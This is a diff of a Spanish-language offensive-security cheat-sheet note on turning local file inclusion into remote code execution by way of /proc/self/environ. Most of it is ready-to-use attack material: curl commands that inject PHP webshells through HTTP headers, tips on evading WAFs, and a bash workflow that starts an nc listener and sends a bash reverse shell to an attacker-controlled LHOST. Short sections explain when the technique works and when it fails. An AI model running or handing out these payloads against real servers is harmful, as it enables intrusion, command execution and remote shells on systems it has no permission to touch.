@@ -1,16 +1,16 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/lfi
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[File Inclusion]]"
+  - '[[File Inclusion]]'
 ---
 # LFI To RCE - /proc/self/environ
 
@@ -18,24 +18,75 @@ linked:
 
 ## Cheatsheet
 
-|              **Técnica**              |                                   **Descripción**                                   |                                       **Payload**                                       |
-|:-------------------------------------:|:-----------------------------------------------------------------------------------:|:---------------------------------------------------------------------------------------:|
-| <br>**Environ básico via User-Agent** | <br>Inyectar código PHP en el User-Agent y luego incluir /proc/self/environ<br><br> |          <br>UA: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>           |
-|      <br>**Environ via Referer**      |                    <br>Inyectar código PHP en el header Referer                     |        <br>Referer: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>        |
-|  <br>**Environ via Accept-Language**  |                 <br>Usar un header menos monitoreado para inyectar                  |    <br>Accept-Language: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>    |
-|      <br>**Environ via Cookie**       |    <br>Inyectar en una cookie que se refleje en las variables de entorno<br><br>    |        <br>Cookie: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>         |
-|   <br>**Environ con reverse shell**   |             <br>Inyectar una reverse shell en vez de un comando simple              |   <br>UA: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>`<br><br>   |
-|     <br>**Environ con cmd param**     |                <br>Inyectar una webshell reutilizable vía parámetro                 | <br>UA: `<?php system($_GET['cmd']); ?>` → LFI: `/proc/self/environ&cmd=whoami`<br><br> |
-|      <br>**Environ con base64**       |             <br>Encodear el payload para evadir WAFs o filtros<br><br>              |                <br>UA: `<?php system(base64_decode('aWQ=')); ?>`<br><br>                |
-|   <br>**Environ via /proc/self/fd**   |      <br>Acceder al environ a través de file descriptors alternativos<br><br>       |                  <br>LFI: `/proc/self/fd/0`, `/proc/self/fd/2`<br><br>                  |
+| **Payload / Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl -A '<?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | User-Agent inyectado en environ → ejecuta al incluir | Webserver con `/proc/self/environ` legible. CGI mode. |
+| `curl -e '<?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | Referer header en environ | UA filtrado por WAF/app. |
+| `curl -H 'Accept-Language: <?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | Accept-Language en environ | Headers menos monitoreados. |
+| `curl -H 'X-Forwarded-For: <?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | XFF en environ | Custom header — pasa la mayoría de WAFs. |
+| `curl -b 'tracking=<?php system($_GET["cmd"]); ?>' 'https://target/?page=/proc/self/environ&cmd=id'` | Cookie en environ (si CGI la propaga como `HTTP_COOKIE`) | CGI environment exposing cookies. |
+| `curl -A '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\""); ?>' 'https://target/?page=/proc/self/environ'` | Reverse shell PHP inyectado via UA | Reverse shell. |
+| `?page=/proc/self/fd/0` o `/proc/self/fd/2` | stdin/stderr del web process | Alt cuando `/proc/self/environ` bloqueado. |
+| `?page=/proc/$PID/environ` (iterar) | Environ de otros procesos | Cuando el LFI permite `/proc/N/`. |
+| `?page=/proc/self/cmdline` | Cmdline del binario actual | Recon previo — confirma proceso/path. |
+| `?page=/proc/self/maps` | Memory maps del proceso | Recon de libs cargadas. |
 ^lfi-environ
 
+### Workflow
 
-***
+```bash
+TARGET="https://target/?page="
+
+# 1. Confirmar /proc/self/environ legible
+curl -s "${TARGET}/proc/self/environ"
+# Debería responder con vars de entorno (HTTP_USER_AGENT=..., HTTP_HOST=..., etc.)
+
+# 2. Inyectar PHP en UA
+curl -s -A '<?php system($_GET["cmd"]); ?>' "${TARGET}/proc/self/environ&cmd=id"
+
+# 3. Si environ bloqueado, probar file descriptors
+for fd in 0 1 2 3 4 5 6 7; do
+  echo "=== /proc/self/fd/$fd ==="
+  curl -s "${TARGET}/proc/self/fd/$fd" | head -3
+done
+
+# 4. Reverse shell directa
+LHOST="10.10.10.10"
+LPORT="4444"
+nc -lvnp $LPORT &
+
+curl -s -A "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"); ?>" \
+  "${TARGET}/proc/self/environ"
+```
+
+### Cuándo NO funciona
+
+- **Apache mod_php moderno** — `/proc/self/environ` típicamente NO contiene HTTP headers (solo env vars del worker).
+- **`/proc` con permisos restrictivos** — webserver no lee `/proc/self/environ` propio.
+- **PHP-FPM** — environ es del proceso master, no por-request.
+- **Sandboxing** — Docker/AppArmor/seccomp bloquea `/proc/*/environ` accesos.
+
+### Cuándo SÍ funciona
+
+- **CGI mode** clásico (mod_cgi en Apache).
+- **PHP CGI vía `php-cgi`** binario.
+- Some legacy shared hosting.
+- Custom backends que ponen headers HTTP en env vars del child process.
+
+___
 
 ## Overview
 
-En sistemas Linux, `/proc/self/environ` contiene las variables de entorno del proceso actual, que en el caso de un servidor web incluyen headers HTTP como `HTTP_USER_AGENT`. Si el proceso web tiene permisos de lectura sobre este archivo, el atacante puede inyectar código PHP en cualquier header HTTP que se refleje en el environ y después incluir el archivo con el LFI para ejecutarlo. Es conceptualmente similar al log poisoning pero más directo, ya que no necesitás conocer la ruta de un log específico. La limitación principal es que muchos servidores modernos corren con permisos restrictivos sobre `/proc`, y en configuraciones actuales este archivo suele no ser legible por el usuario del web server.
+En setups CGI clásicos, el webserver pasa headers HTTP como env vars (`HTTP_USER_AGENT`, `HTTP_REFERER`, etc.) al proceso child que sirve el request. Esas vars quedan en `/proc/self/environ` mientras el proceso vive.
 
+**Mecanismo:**
+1. Atacante envía request con PHP en User-Agent.
+2. Server lanza child process con env `HTTP_USER_AGENT=<?php system... ?>`.
+3. Child process abre LFI → `include('/proc/self/environ')`.
+4. PHP encuentra `<?php ... ?>` en el contenido del environ → ejecuta.
+
+**Limitación crítica**: en stacks modernos (mod_php, FPM, sandboxed) este vector NO funciona porque los headers no van al environ. Es un vector legacy pero efectivo cuando aplica.
+
+Similar conceptualmente a [[LFI To RCE - Log Poisoning]] pero más directo — no requiere conocer paths de logs ni permisos especiales sobre `/var/log/`.
 
 ***
